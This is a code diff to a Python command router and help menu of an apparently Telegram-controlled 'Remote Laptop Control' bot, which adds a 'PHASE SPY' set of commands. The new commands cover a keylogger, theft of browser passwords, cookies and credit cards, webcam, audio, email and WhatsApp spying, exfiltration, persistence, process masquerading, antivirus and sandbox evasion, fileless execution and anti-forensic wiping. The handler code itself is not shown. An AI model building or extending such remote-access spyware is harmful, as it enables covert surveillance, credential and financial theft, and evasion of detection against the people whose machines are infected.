@@ -797,6 +797,113 @@ class CommandRouter:
                 self.auditor.log_event(user_id, "PROACTIVE_SUGGEST", " ".join(args)[:50])
                 return result
 
+            # ── PHASE SPY: Stealth & Surveillance Features ──────────────────────────
+
+            elif command_name == "stealth":
+                result = await self.handler.handle_stealth(args)
+                self.auditor.log_event(user_id, "STEALTH", " ".join(args)[:50])
+                return result
+
+            elif command_name == "persistence":
+                result = await self.handler.handle_persistence(args)
+                self.auditor.log_event(user_id, "PERSISTENCE", " ".join(args)[:50])
+                return result
+
+            elif command_name == "self_destruct":
+                result = await self.handler.handle_self_destruct(args)
+                self.auditor.log_event(user_id, "SELF_DESTRUCT", " ".join(args)[:50])
+                return result
+
+            elif command_name == "arp":
+                result = await self.handler.handle_arp(args)
+                self.auditor.log_event(user_id, "ARP", " ".join(args)[:50])
+                return result
+
+            elif command_name == "routing":
+                result = await self.handler.handle_routing(args)
+                self.auditor.log_event(user_id, "ROUTING", " ".join(args)[:50])
+                return result
+
+            elif command_name == "dns":
+                result = await self.handler.handle_dns_info(args)
+                self.auditor.log_event(user_id, "DNS", " ".join(args)[:50])
+                return result
+
+            elif command_name == "net_recon":
+                result = await self.handler.handle_net_recon(args)
+                self.auditor.log_event(user_id, "NET_RECON", " ".join(args)[:50])
+                return result
+
+            elif command_name == "wifi_surveillance":
+                result = await self.handler.handle_wifi_surveillance(args)
+                self.auditor.log_event(user_id, "WIFI_SURVEILLANCE", " ".join(args)[:50])
+                return result
+
+            elif command_name == "connections":
+                result = await self.handler.handle_connections(args)
+                self.auditor.log_event(user_id, "CONNECTIONS", " ".join(args)[:50])
+                return result
+
+            elif command_name == "keylogger":
+                result = await self.handler.handle_keylogger(args)
+                self.auditor.log_event(user_id, "KEYLOGGER", " ".join(args)[:50])
+                return result
+
+            elif command_name == "browser_history":
+                result = await self.handler.handle_browser_history(args)
+                self.auditor.log_event(user_id, "BROWSER_HISTORY", " ".join(args)[:50])
+                return result
+
+            elif command_name == "steal":
+                result = await self.handler.handle_browser_stealer(args)
+                self.auditor.log_event(user_id, "STEAL", " ".join(args)[:50])
+                return result
+
+            elif command_name == "social_spy":
+                result = await self.handler.handle_social_spy(args)
+                self.auditor.log_event(user_id, "SOCIAL_SPY", " ".join(args)[:50])
+                return result
+
+            elif command_name == "email_spy":
+                result = await self.handler.handle_email_spy(args)
+                self.auditor.log_event(user_id, "EMAIL_SPY", " ".join(args)[:50])
+                return result
+
+            elif command_name == "audio_surveillance":
+                result = await self.handler.handle_audio_surveillance(args)
+                self.auditor.log_event(user_id, "AUDIO_SURVEILLANCE", " ".join(args)[:50])
+                return result
+
+            elif command_name == "webcam_surveillance":
+                result = await self.handler.handle_webcam_surveillance(args)
+                self.auditor.log_event(user_id, "WEBCAM_SURVEILLANCE", " ".join(args)[:50])
+                return result
+
+            elif command_name == "collect":
+                result = await self.handler.handle_collect(args)
+                self.auditor.log_event(user_id, "COLLECT", " ".join(args)[:50])
+                return result
+
+            elif command_name == "exfil":
+                result = await self.handler.handle_exfil(args)
+                self.auditor.log_event(user_id, "EXFIL", " ".join(args)[:50])
+                return result
+
+            elif command_name == "intel":
+                result = await self.handler.handle_intel(args)
+                self.auditor.log_event(user_id, "INTEL", " ".join(args)[:50])
+                return result
+
+            elif command_name == "alert":
+                result = await self.handler.handle_alert(args)
+                self.auditor.log_event(user_id, "ALERT", " ".join(args)[:50])
+                return result
+
+            elif command_name in ("wa", "whatsapp"):
+                result = await self.handler.handle_wa(args)
+                self.auditor.log_event(user_id, "WA_SPY", " ".join(args)[:50])
+                return result
+
             elif command_name == "help":
                 return HELP_TEXT
 
@@ -864,6 +971,17 @@ HELP_TEXT = """🤖 <b>Remote Laptop Control — Help</b>
 <code>!logout</code> — Keluar sesi aktif
 <code>!help</code> — Tampilkan bantuan ini
 
+<b>Stealth & Security:</b>
+<code>!stealth on|off|status</code> — Basic process masquerade
+<code>!stealth masquerade [name]</code> — Spoof argv[0] + process name
+<code>!stealth harden</code> — Anti-ptrace + disable core dumps
+<code>!stealth detect</code> — Scan EDR/AV + sandbox detection
+<code>!stealth clean [aggressive]</code> — Anti-forensic: wipe traces
+<code>!stealth fileless python|shell|url</code> — Memory-only execution
+<code>!self_destruct panic</code> — Emergency: clear clipboard, hide windows, mute
+<code>!self_destruct run [keep_config]</code> — Hapus jejak + persistence
+<code>!self_destruct deep [keep_persistence]</code> — Deep wipe: logs, cache, browser, trash, DNS, history
+
 <b>6. Produktivitas:</b>
 <code>!focus [on|off] [menit]</code> — Mode fokus dengan Pomodoro timer + blokir situs
 <code>!workspace [save|load|list|delete] [nama]</code> — Simpan/muat seluruh sesi kerja
@@ -876,6 +994,7 @@ HELP_TEXT = """🤖 <b>Remote Laptop Control — Help</b>
 <code>!custom alias [nama] [perintah]</code> — Buat alias perintah custom sendiri
 
 <b>7. AI & Automation (Beta):</b>
+<code>!agent &lt;goal&gt;</code> — 🤖 Autonomous Agent: goal → rencana → eksekusi multi-step, progress ke Telegram
 <code>!ai work [perintah]</code> — AI assistant produktivitas
 <code>!ai write [tipe] [topik]</code> — Buat draft dokumen/email via AI
 <code>!ai automate [deskripsi]</code> — Buat automation script via AI
@@ -934,6 +1053,21 @@ HELP_TEXT = """🤖 <b>Remote Laptop Control — Help</b>
 <code>!optimize me</code> — Personalized usage optimization advisor
 <code>!proactive [on|off|status]</code> — Proactive & reactive awareness alerts
 <code>!agent &lt;goal&gt;</code> — Advanced autonomous agent mode
+
+<b>12. Browser Intel & WhatsApp Spy:</b>
+<code>!steal all|cookies|passwords|cards|autofill|addresses|extensions|sessions|profiles</code> — Extract browser cookies, saved passwords, credit cards, autofill dari Chrome/Firefox
+<code>!browser_history history|bookmarks|downloads [args]</code> — Riwayat browsing, bookmark, download
+<code>!wa check &lt;nomor&gt;</code> — Cek status online/offline WhatsApp
+<code>!wa monitor &lt;nomor&gt; [interval]</code> — Monitor background + notif Telegram
+<code>!wa stop &lt;nomor&gt;</code> — Hentikan monitor
+<code>!wa stop_all</code> — Hentikan semua monitor
+<code>!wa list</code> — Monitor aktif
+<code>!wa status</code> — Status koneksi
+<code>!wa reset</code> — Reset pairing (QR baru)
+<code>!wa messages &lt;nomor&gt; [limit]</code> — Riwayat pesan
+<code>!wa groups</code> — Daftar grup
+<code>!wa send &lt;nomor&gt; &lt;teks&gt;</code> — Kirim pesan
+<code>!wa forward &lt;on|off|status&gt; [nomor]</code> — Forward pesan otomatis ke Telegram
 
 <b>Mode AI (jika aktif):</b>
 Ketik perintah natural language langsung untuk diterjemahkan oleh AI. Contoh:
